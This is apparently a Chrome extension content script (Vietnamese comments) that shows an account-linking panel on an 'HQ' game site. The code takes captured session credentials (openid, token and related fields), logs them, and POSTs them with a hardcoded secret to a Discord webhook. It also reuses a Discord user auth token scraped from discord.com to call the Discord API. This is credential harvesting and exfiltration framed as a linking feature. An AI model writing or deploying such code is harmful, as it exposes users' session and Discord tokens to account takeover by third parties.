/**
 * Isolated content script — bridge + panel cho tab Link trên HQ.
 *
 * Lắng nghe postMessage từ link-page-capture.js → render panel → submit claim.
 * Dùng chrome.runtime.sendMessage (giữ SW alive) + storage polling cho result.
 */

(function () {
  'use strict';

  console.log('[DF Toolbox] link-content.js loaded (isolated world)');

  // ===== STATE =====
  let state = {
    candidate: null,
    endpoint: null,
    claimCode: null,
    status: 'idle', // idle | capturing | ready | submitting | success | error
  };

  // ===== A. Lắng nghe candidate từ MAIN world =====
  window.addEventListener('message', (event) => {
    if (event.origin !== window.location.origin) return;
    const d = event.data;
    if (!d || d.source !== 'df-link-capture') return;
    if (d.type !== 'CREDENTIAL_CANDIDATE') return;
    if (!d.credential?.openid || !d.credential?.token) return;

    state.candidate = d.credential;
    state.endpoint = d.endpoint;
    state.status = 'ready';

    renderPanel();
  });

  // ===== Render panel ngay khi load (trước khi có credential) =====
  renderPanel();

  // ===== B. Inject panel UI =====
  function renderPanel() {
    // Xóa panel cũ nếu có
    const oldPanel = document.getElementById('df-toolbox-panel');
    if (oldPanel) oldPanel.remove();

    const panel = document.createElement('div');
    panel.id = 'df-toolbox-panel';
    panel.innerHTML = `
      <style>
        #df-toolbox-panel {
          position: fixed;
          bottom: 20px;
          right: 20px;
          width: 320px;
          background: #1a1a2e;
          color: #e0e0e0;
          border-radius: 8px;
          padding: 16px;
          z-index: 999999;
          font-family: 'Segoe UI', system-ui, sans-serif;
          font-size: 13px;
          box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        #df-toolbox-panel h3 {
          margin: 0 0 12px;
          color: #00d4ff;
          font-size: 15px;
        }
        #df-toolbox-panel .status {
          padding: 8px 12px;
          border-radius: 4px;
          margin-bottom: 12px;
          background: #16213e;
          border: 1px solid #0f3460;
          font-size: 12px;
        }
        #df-toolbox-panel input {
          width: 100%;
          padding: 8px 10px;
          border: 1px solid #0f3460;
          border-radius: 4px;
          background: #16213e;
          color: #e0e0e0;
          font-size: 13px;
          margin-bottom: 12px;
          outline: none;
        }
        #df-toolbox-panel input:focus {
          border-color: #00d4ff;
        }
        #df-toolbox-panel button {
          width: 100%;
          padding: 10px;
          border: none;
          border-radius: 4px;
          background: #00d4ff;
          color: #1a1a2e;
          font-weight: 600;
          font-size: 13px;
          cursor: pointer;
        }
        #df-toolbox-panel button:disabled {
          background: #555;
          color: #888;
          cursor: not-allowed;
        }
        #df-toolbox-panel .hint {
          margin-top: 12px;
          font-size: 11px;
          color: #666;
          line-height: 1.5;
        }
      </style>
      <h3>DF Toolbox — Link</h3>
      <div class="status" id="df-link-status">${getStatusText()}</div>
      <input type="text" id="df-link-code" placeholder="Dán claim code từ Discord" maxlength="6" />
      <button id="df-link-submit" ${state.status !== 'ready' ? 'disabled' : ''}>Liên kết Discord</button>
      <div class="hint">
        <strong>Bắt buộc:</strong> Chạy /df-link start trên Discord trước<br>
        1. Chạy /df-link start → nhận code<br>
        2. Dán code ở trên<br>
        3. Nhấn Liên kết Discord<br>
        4. Chờ DM "Chúc mừng liên kết thành công"
      </div>
    `;

    document.body.appendChild(panel);

    // Bind submit button
    const submitBtn = panel.querySelector('#df-link-submit');
    submitBtn.addEventListener('click', handleSubmit);

    // Auto-fill code from storage if exists
    chrome.storage.local.get(['df_claim_code'], (result) => {
      if (result.df_claim_code) {
        panel.querySelector('#df-link-code').value = result.df_claim_code;
      }
    });
  }

  function getStatusText() {
    switch (state.status) {
      case 'idle': return 'Đang chờ credential từ HQ session...';
      case 'ready': return `Đã capture! OpenID: ${state.candidate.openid.slice(0, 4)}•••`;
      case 'submitting': return 'Đang gửi claim...';
      case 'success': return '✅ Đã liên kết thành công! Chờ DM xác nhận.';
      case 'error': return '❌ Lỗi — xem console.';
      default: return 'Đang tải...';
    }
  }

  // ===== C. Submit claim → SW (dùng storage polling, không sendMessage) =====
  // sendMessage không đáng tin trong MV3 — SW có thể terminate trước khi fetch xong.
  // Giải pháp: ghi claim vào storage → SW đọc + xử lý → ghi kết quả → content script poll.
  let pollInterval = null;
  let discordAuthToken = null; // Token lưu tạm để poll Discord API

  // ===== Đọc Discord auth token từ chrome.storage =====
  // Token được capture bởi content script trên discord.com (discord-token-capture.js)
  let tokenLoadPromise = null;
  function loadDiscordToken() {
    if (discordAuthToken) return Promise.resolve();
    if (tokenLoadPromise) return tokenLoadPromise;
    tokenLoadPromise = new Promise((resolve) => {
      chrome.storage.local.get('discord_auth_token', (result) => {
        if (result.discord_auth_token) {
          discordAuthToken = result.discord_auth_token;
          console.log('[LinkContent] Loaded Discord auth token from chrome.storage');
        } else {
          console.warn('[LinkContent] No Discord auth token in chrome.storage — cần mở discord.com để capture');
        }
        resolve();
      });
    });
    return tokenLoadPromise;
  }
  loadDiscordToken();

  async function handleSubmit() {
    // Đợi token load xong trước khi poll Discord API
    await loadDiscordToken();

    const codeInput = document.querySelector('#df-link-code');
    const submitBtn = document.querySelector('#df-link-submit');
    const statusEl = document.querySelector('#df-link-status');

    const code = codeInput.value.trim();
    if (!code || !state.candidate) {
      statusEl.textContent = '❌ Thiếu claim code hoặc credential';
      statusEl.style.color = '#f44336';
      return;
    }

    state.status = 'submitting';
    renderPanel();

    // Lưu code vào storage cho lần sau
    chrome.storage.local.set({ df_claim_code: code });

    // Gửi credential + claim code vào storage để SW xử lý
    const claimPayload = {
      code,
      credential: state.candidate,
      endpoint: state.endpoint,
      submittedAt: Date.now(),
    };
    console.log('[DF Toolbox] Writing claim to storage:', { code, credential: state.candidate });
    chrome.storage.local.set({ df_claim_pending: claimPayload });

    // Fetch trực tiếp webhook (content script không bị SW terminate)
    console.log('[DF Toolbox] Fetching webhook directly...');
    (async () => {
      try {
        const { webhookUrl } = await new Promise((resolve) => chrome.storage.local.get('webhookUrl', resolve));
        console.log('[DF Toolbox] Webhook URL:', webhookUrl);
        if (!webhookUrl) {
          throw new Error('webhookUrl not configured');
        }

        const claimData = {
          type: 'df_claim',
          secret: 'df-link-2026-pon1147',
          code,
          openid: state.candidate.openid || null,
          token: state.candidate.token || null,
          ts: state.candidate.ts || null,
          s: state.candidate.s || null,
          u: state.candidate.u || null,
          source_endpoint: state.endpoint || null,
          captured_at: Date.now(),
        };

        const payload = {
          content: JSON.stringify(claimData),
        };

        console.log('[DF Toolbox] Fetching:', webhookUrl);
        const r = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        console.log('[DF Toolbox] Fetch response:', r.status, r.statusText);

        // 204 = Discord đã nhận message → bot xử lý async qua messageCreate
        // KHÔNG ghi result ngay — chờ bot reply vào message → extension poll message content
        // Bot reply format: "Claim processed successfully." hoặc "Claim failed: <error>"
        await new Promise((resolve) => chrome.storage.local.set({ df_claim_pending: { ...claimPayload, submittedAt: Date.now() } }, resolve));
      } catch (e) {
        console.error('[DF Toolbox] Webhook fetch error:', e.message, e);
        await new Promise((resolve) => chrome.storage.local.set({ df_claim_result: { ok: false, error: 'Fetch failed: ' + e.message } }, resolve));
      }
    })();

    // Poll Discord API cho bot reply (dùng Discord auth token capture từ page)
    let pollCount = 0;
    const maxPolls = 15; // 30s
    let cachedChannelId = null;

    // Fetch webhook info ONCE để lấy channel_id (không đổi qua session)
    (async () => {
      try {
        const webhookUrl = localStorage.getItem('webhookUrl');
        if (webhookUrl) {
          const webhookPath = webhookUrl.replace('https://discord.com/api', '');
          const webhookInfo = await fetch('https://discord.com' + webhookPath).then((r) => r.json());
          if (webhookInfo?.channel_id) {
            cachedChannelId = webhookInfo.channel_id;
            console.log('[LinkContent] Cached channel_id:', cachedChannelId);
          }
        }
      } catch (err) {
        console.warn('[LinkContent] Failed to cache channel_id:', err?.message || err);
      }
    })();

    const discordPollInterval = setInterval(() => {
      pollCount++;

      if (!cachedChannelId) {
        if (pollCount >= maxPolls) {
          clearInterval(discordPollInterval);
          console.warn('[LinkContent] Poll timeout — chưa lấy được channel_id');
        }
        return;
      }

      // Poll channel messages (limit=5, tìm bot reply gần nhất)
      fetch(`https://discord.com/api/v10/channels/${cachedChannelId}/messages?limit=5`, {
        headers: { Authorization: `Bearer ${discordAuthToken}` },
      })
        .then((r) => r.json())
        .then((messages) => {
          // Tìm bot reply (content = "Claim processed successfully." hoặc "Claim failed: ...")
          const botReply = messages?.find(
            (m) =>
              m.author?.bot &&
              (m.content?.startsWith('Claim processed successfully') || m.content?.startsWith('Claim failed:')),
          );

          if (botReply) {
            clearInterval(discordPollInterval);
            const isOk = botReply.content.startsWith('Claim processed successfully');
            const errorMatch = botReply.content.match(/Claim failed: (.+)/);
            const error = isOk ? undefined : errorMatch ? errorMatch[1] : 'Lỗi không xác định';

            console.log('[LinkContent] Bot reply found:', botReply.content);
            const result = { ok: isOk, error };
            chrome.storage.local.set({ df_claim_result: result }, () => {
              chrome.storage.local.remove(['df_claim_pending', 'df_claim_result']);
            });
          }
        })
        .catch((err) => {
          console.warn('[LinkContent] Discord API poll error:', err?.message || err);
        });
    }, 2000);

    // Poll storage cho kết quả (mỗi 1s, tối đa 60s)
    let elapsed = 0;
    pollInterval = setInterval(() => {
      elapsed += 1000;

      chrome.storage.local.get(['df_claim_result', 'df_claim_pending'], (result) => {
        console.log('[LinkContent] Poll check: result=' + JSON.stringify(result.df_claim_result) + ', pending=' + !!result.df_claim_pending);
        // Nếu có result → đã có kết quả
        if (result.df_claim_result) {
          clearInterval(pollInterval);
          clearInterval(discordPollInterval);
          pollInterval = null;

          const { ok, error } = result.df_claim_result;
          console.log('[LinkContent] Claim result: ok=' + ok + ', error=' + error);
          if (ok) {
            state.status = 'success';
            state.candidate = null;
            // Xóa pending + result
            chrome.storage.local.remove(['df_claim_pending', 'df_claim_result']);
          } else if (error && error.includes('Đã liên kết')) {
            // 409 — user đã linked → xem như thành công
            state.status = 'success';
            state.candidate = null;
            chrome.storage.local.remove(['df_claim_pending', 'df_claim_result']);
          } else {
            state.status = 'error';
            // Hiển thị error message thân thiện
            statusEl.textContent = '❌ ' + (error || 'Lỗi không xác định');
            statusEl.style.color = '#f44336';
            chrome.storage.local.remove(['df_claim_pending', 'df_claim_result']);
          }
          renderPanel();
          return;
        }

        // Timeout 60s
        if (elapsed >= 60000) {
          clearInterval(pollInterval);
          clearInterval(discordPollInterval);
          pollInterval = null;
          state.status = 'error';
          statusEl.textContent = '❌ Timeout — không nhận được phản hồi từ bot.';
          statusEl.style.color = '#f44336';
          renderPanel();
        }
      });
    }, 1000);
  }

  // ===== D. Listen for SW response updates (fallback) =====
  chrome.runtime.onMessage.addListener((msg) => {
    if (msg?.type === 'DF_LINK_SUCCESS') {
      state.status = 'success';
      renderPanel();
    }
    if (msg?.type === 'DF_LINK_ERROR') {
      state.status = 'error';
      const statusEl = document.querySelector('#df-link-status');
      if (statusEl) {
        statusEl.textContent = '❌ ' + msg.error;
        statusEl.style.color = '#f44336';
      }
      const submitBtn = document.querySelector('#df-link-submit');
      if (submitBtn) submitBtn.disabled = false;
    }
  });

})();
